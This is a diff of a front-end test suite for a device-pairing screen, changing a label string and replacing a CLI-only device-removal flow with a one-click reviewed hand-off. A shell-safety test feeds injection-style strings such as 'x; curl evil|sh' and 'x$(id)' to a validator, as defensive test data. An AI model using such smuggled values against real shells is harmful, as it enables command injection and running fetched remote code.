@@ -272,7 +272,7 @@ describe('compare the code', () => {
     const { user } = open('pair-pending')
     await user.click(await screen.findByRole('button', { name: 'Reject' }, T))
     await waitFor(() => expect(pairPreviewForTests.fixture()!.calls.find((c) => c.op === 'answer')?.args).toEqual(['7'.repeat(32), false]))
-    expect(await screen.findByTestId('pair-end-rejected', {}, T)).toHaveTextContent('Rejected on this Mac.')
+    expect(await screen.findByTestId('pair-end-rejected', {}, T)).toHaveTextContent('Rejected on this computer.')
   })
 
   it('checkSas: base32, case-insensitive, spaces and dashes ignored', () => {
@@ -325,13 +325,11 @@ describe('after the code', () => {
 
 describe('commands for the shell (review N1)', () => {
   it('only plain words from the host go into a command; anything else gives no command', async () => {
-    const { shellWord, deviceRemoveCommand, primaryCommand, convenienceOffCommand } = await import('@/api/pairing')
+    const { shellWord, primaryCommand, convenienceOffCommand } = await import('@/api/pairing')
     for (const bad of ['x; curl evil|sh', 'x$(id)', 'a\u202Eb', 'a\u200Bb', '', '-rf', 'a b', 'a\nb']) {
       expect(shellWord(bad)).toBe(false)
-      expect(deviceRemoveCommand(bad, 'DEMO')).toBeNull()
       expect(convenienceOffCommand(bad)).toBeNull()
     }
-    expect(deviceRemoveCommand('d_' + '2'.repeat(32), 'DEMO')).toBe('orch device remove d_' + '2'.repeat(32) + ' --workspace DEMO')
     expect(primaryCommand('7'.repeat(32))).toBe('orch host relay pair --resume --offer ' + '7'.repeat(32))
     for (const bad of ['of_c', '7'.repeat(31), 'A'.repeat(32), '7'.repeat(31) + ';', null, undefined]) expect(primaryCommand(bad)).toBeNull()
   })
@@ -356,18 +354,16 @@ describe('paired devices', () => {
     expect(pairPreviewForTests.fixture()!.calls.map((c) => c.op)).toContain('members')
   })
 
-  it('removal is CLI only: a disclosure with the copyable command, no hand-off', async () => {
+  it('removal is one click after a review (#1198 C15): the hand-off is prepared for exactly that device, no command is shown', async () => {
     const { user } = open('pair-devices')
     const rows = await screen.findAllByTestId('device-row', {}, T)
     const spy = vi.spyOn(api, 'prepareHandoff')
-    expect(within(rows[1]).queryByRole('button', { name: 'Remove' })).toBeNull()
-    await user.click(within(rows[1]).getByText('Remove this device'))
-    const command = within(rows[1]).getByTestId('device-remove-command')
-    expect(command.textContent).toBe('orch device remove d_' + '2'.repeat(32) + ' --workspace DEMO')
-    expect(command.closest('a')).toBeNull()
-    expect(rows[1]).toHaveTextContent('rotates the relay keys')
-    expect(spy).not.toHaveBeenCalled()
-    expect(screen.queryByRole('dialog')).toBeNull()
+    expect(within(rows[1]).queryByTestId('device-remove-command')).toBeNull()
+    await user.click(within(rows[1]).getByRole('button', { name: 'Remove' }))
+    await screen.findByRole('dialog', {}, T)
+    expect(spy.mock.calls[0][1]).toEqual({ action: 'device_remove', device: 'd_' + '2'.repeat(32) })
+    expect(await screen.findByTestId('device-remove-summary', {}, T)).toHaveTextContent('Severin') // whose device it is
+    spy.mockRestore()
   })
 
   it('a label with an LF shows a line break inside the isolated text, never markup; an empty label shows "phone"', async () => {
